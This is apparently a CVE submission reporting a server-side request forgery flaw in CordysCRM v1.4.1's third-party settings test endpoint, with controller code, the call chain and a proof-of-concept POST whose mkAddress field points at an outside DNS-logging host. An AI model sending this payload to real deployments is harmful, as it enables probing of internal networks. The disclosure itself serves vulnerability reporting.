# CVE Submission: CordysCRM SSRF Vulnerability in /organization/settings/third-party/test
...
CordysCRM v1.4.1 contains a Server-Side Request Forgery (SSRF) vulnerability in the `/organization/settings/third-party/test` endpoint. The vulnerability exists because the backend `IntegrationConfigService.java` fails to validate or sanitize the `mkAddress` parameter when processing SQLBOT configuration test requests. The parameter is directly concatenated into a URL and used to make HTTP requests without any whitelist validation, protocol restriction, or internal IP blocking.

**This endpoint requires lower privileges (SYSTEM_SETTING_READ) compared to the edit endpoint, making it more accessible to potential attackers.**
...
```java
@PostMapping("/third-party/test")
@Operation(summary = "Test third-party settings connection")
@RequiresPermissions(PermissionConstants.SYSTEM_SETTING_READ)
public void validate(@Validated @RequestBody ThirdConfigBaseDTO<Object> baseDTO) {
    integrationConfigService.testConnection(baseDTO, OrganizationContext.getOrganizationId());
}
```
...
```java
// Call testConnection
public void testConnection(ThirdConfigBaseDTO<Object> configDTO, Long organizationId) {
    // ... inside getToken ...
    case SQLBOT -> {
...
```
OrganizationSettingsController.validate()
  → IntegrationConfigService.testConnection()
    → IntegrationConfigService.getToken()
      → case SQLBOT: tokenService.getMaxKBToken(mkAddress, appSecret)
...
```http
POST /organization/settings/third-party/test HTTP/1.1
...
"tenderEnable": false,
"type": "SQLBOT",
"mkAddress": "http://a4784cdc.log.dnslog.pp.ua.",
"appSecret": "1111"
}
```
...
After sending the POC, DNS resolution records were received at the DNS log platform, confirming the existence of the SSRF vulnerability.

**Burp Suite POC Request:**


<img width="829" height="271" alt="ssrf2-burp-request" src="https://github.com/user-attachments/assets/bd451ef2-ceef-47a5-906e-7ae67334ed22" />

**DNS Callback Received via Interactsh:**

<img width="830" height="330" alt="image-20260613232225105" src="https://github.com/user-attachments/assets/6d41cd43-3e72-4bf0-889d-c19045bf55da" />
...
- https://github.com/1Panel-dev/CordysCRM/issues/2686
